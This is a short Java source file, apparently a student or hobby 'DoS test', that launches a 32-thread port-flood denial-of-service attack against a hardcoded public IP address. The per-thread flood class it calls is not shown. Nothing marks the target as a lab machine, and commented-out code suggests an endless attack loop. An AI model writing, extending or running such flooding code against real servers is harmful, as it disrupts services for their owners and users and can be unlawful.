package Service_Port_Flood_3;

import java.io.IOException;
import java.net.InetAddress;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PruebaDoS3 {

    public static void main(String[] args) throws IOException {
    //public static void port_flood(){
        InetAddress servidor;
        int n_hilos = 32;
        ExecutorService pool = Executors.newFixedThreadPool(n_hilos);
        try {
            servidor = InetAddress.getByName("86.109.162.12");
            System.out.println("Obtenida ip del servidor");
            System.out.println(servidor);
            //while(true){
            for(int i=0; i<n_hilos; i++){
                pool.execute(new Hilo3(servidor));
            }
        } catch (IOException e) {
            System.out.println("Error al conectarse con el servidor");
            pool.shutdown();
            System.exit(0);
        }
    }
}
